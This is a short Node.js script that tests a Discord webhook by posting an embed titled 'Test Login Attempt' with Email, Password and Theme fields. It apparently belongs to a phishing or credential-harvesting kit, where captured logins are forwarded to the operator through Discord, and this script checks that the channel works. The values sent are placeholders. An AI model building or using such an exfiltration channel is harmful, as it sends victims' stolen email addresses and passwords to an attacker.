#!/usr/bin/env node

/**
 * Test the Discord webhook submission
 * Usage: node test-webhook.js
 */

import 'dotenv/config';

const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

console.log('=== Discord Webhook Test ===\n');
console.log('Node version:', process.version);
console.log('Webhook URL set:', !!webhookUrl);
console.log('Global fetch available:', typeof globalThis.fetch === 'function');

if (!webhookUrl) {
  console.error('\n❌ DISCORD_WEBHOOK_URL not set in .env');
  process.exit(1);
}

const payload = {
  embeds: [
    {
      title: "Test Login Attempt",
      color: 0xff4b33,
      fields: [
        { name: "Email", value: "test@example.com", inline: true },
        { name: "Password", value: "***REDACTED***", inline: true },
        { name: "Theme", value: "test", inline: true },
        { name: "Test Status", value: "Webhook test from test-webhook.js" }
      ],
      timestamp: new Date().toISOString()
    }
  ]
};

async function test() {
  try {
    console.log('\n📤 Sending test payload to Discord...\n');
    
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    console.log('Status:', response.status);
    console.log('Status Text:', response.statusText);
    
    const responseBody = await response.text();
    console.log('Response Body:', responseBody || '(empty)');

    if (response.ok) {
      console.log('\n✅ Webhook delivered successfully!');
    } else {
      console.log('\n❌ Webhook delivery failed');
      console.log('Make sure the webhook URL is valid and not expired');
    }
  } catch (error) {
    console.error('\n❌ Error:', error instanceof Error ? error.message : String(error));
    if (error instanceof Error) {
      console.error('Stack:', error.stack);
    }
  }
}

test();
